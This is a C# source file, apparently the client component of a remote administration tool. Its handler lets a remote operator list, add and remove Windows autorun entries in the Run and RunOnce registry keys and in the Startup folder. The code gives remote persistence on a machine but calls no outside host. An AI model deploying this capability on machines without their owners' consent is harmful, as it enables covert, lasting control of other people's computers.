using Microsoft.Win32;
using Orion.Client.Extensions;
using Orion.Client.Helper;
using Orion.Common.Enums;
using Orion.Common.Helpers;
using Orion.Common.Messages;
using Orion.Common.Messages.Administration.StartupManager;
using Orion.Common.Messages.Other;
using Orion.Common.Networking;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Orion.Client.Messages
{
    public class StartupManagerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetStartupItems ||
                                                             message is DoStartupItemAdd ||
                                                             message is DoStartupItemRemove;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetStartupItems msg:
                    Execute(sender, msg);
                    break;
                case DoStartupItemAdd msg:
                    Execute(sender, msg);
                    break;
                case DoStartupItemRemove msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetStartupItems message)
        {
            try
            {
                List<Common.Models.StartupItem> startupItems = new List<Common.Models.StartupItem>();

                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, StrTable.RegRunLM))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRun });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, StrTable.RegRunOnceLM))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnce });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, StrTable.RegRunLM))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRun });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, StrTable.RegRunOnceLM))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.CurrentUserRunOnce });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, StrTable.RegRunLMX86))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunX86 });
                        }
                    }
                }
                using (var key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, StrTable.RegRunOnceLMX86))
                {
                    if (key != null)
                    {
                        foreach (var item in key.GetKeyValues())
                        {
                            startupItems.Add(new Common.Models.StartupItem
                            { Name = item.Item1, Path = item.Item2, Type = StartupType.LocalMachineRunOnceX86 });
                        }
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                {
                    var files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();

                    startupItems.AddRange(files.Where(file => file.Name != "desktop.ini").Select(file => new Common.Models.StartupItem
                    { Name = file.Name, Path = file.FullName, Type = StartupType.StartMenu }));
                }

                client.Send(new GetStartupItemsResponse { StartupItems = startupItems });
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"获取自启动项失败: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoStartupItemAdd message)
        {
            try
            {
                switch (message.StartupItem.Type)
                {
                    case StartupType.LocalMachineRun:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunLM, message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("无法添加注册表值");
                        }
                        break;
                    case StartupType.LocalMachineRunOnce:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunOnceLM, message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("无法添加注册表值");
                        }
                        break;
                    case StartupType.CurrentUserRun:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            StrTable.RegRunLM, message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("无法添加注册表值");
                        }
                        break;
                    case StartupType.CurrentUserRunOnce:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                            StrTable.RegRunOnceLM, message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("无法添加注册表值");
                        }
                        break;
                    case StartupType.LocalMachineRunX86:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunLMX86, message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("无法添加注册表值");
                        }
                        break;
                    case StartupType.LocalMachineRunOnceX86:
                        if (!RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunOnceLMX86, message.StartupItem.Name, message.StartupItem.Path, true))
                        {
                            throw new Exception("无法添加注册表值");
                        }
                        break;
                    case StartupType.StartMenu:
                        if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                        {
                            Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        }

                        string lnkPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                            message.StartupItem.Name + ".url");

                        using (var writer = new StreamWriter(lnkPath, false))
                        {
                            writer.WriteLine("[InternetShortcut]");
                            writer.WriteLine("URL=file:///" + message.StartupItem.Path);
                            writer.WriteLine("IconIndex=0");
                            writer.WriteLine("IconFile=" + message.StartupItem.Path.Replace('\\', '/'));
                            writer.Flush();
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"添加自启动项失败: {ex.Message}" });
            }
        }

        private void Execute(ISender client, DoStartupItemRemove message)
        {
            try
            {
                switch (message.StartupItem.Type)
                {
                    case StartupType.LocalMachineRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunLM, message.StartupItem.Name))
                        {
                            throw new Exception("无法删除注册表值");
                        }
                        break;
                    case StartupType.LocalMachineRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunOnceLM, message.StartupItem.Name))
                        {
                            throw new Exception("无法删除注册表值");
                        }
                        break;
                    case StartupType.CurrentUserRun:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            StrTable.RegRunLM, message.StartupItem.Name))
                        {
                            throw new Exception("无法删除注册表值");
                        }
                        break;
                    case StartupType.CurrentUserRunOnce:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                            StrTable.RegRunOnceLM, message.StartupItem.Name))
                        {
                            throw new Exception("无法删除注册表值");
                        }
                        break;
                    case StartupType.LocalMachineRunX86:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunLMX86, message.StartupItem.Name))
                        {
                            throw new Exception("无法删除注册表值");
                        }
                        break;
                    case StartupType.LocalMachineRunOnceX86:
                        if (!RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine,
                            StrTable.RegRunOnceLMX86, message.StartupItem.Name))
                        {
                            throw new Exception("无法删除注册表值");
                        }
                        break;
                    case StartupType.StartMenu:
                        string startupItemPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), message.StartupItem.Name);

                        if (!File.Exists(startupItemPath))
                            throw new IOException("文件不存在");

                        File.Delete(startupItemPath);
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"删除自启动项失败: {ex.Message}" });
            }
        }
    }
}
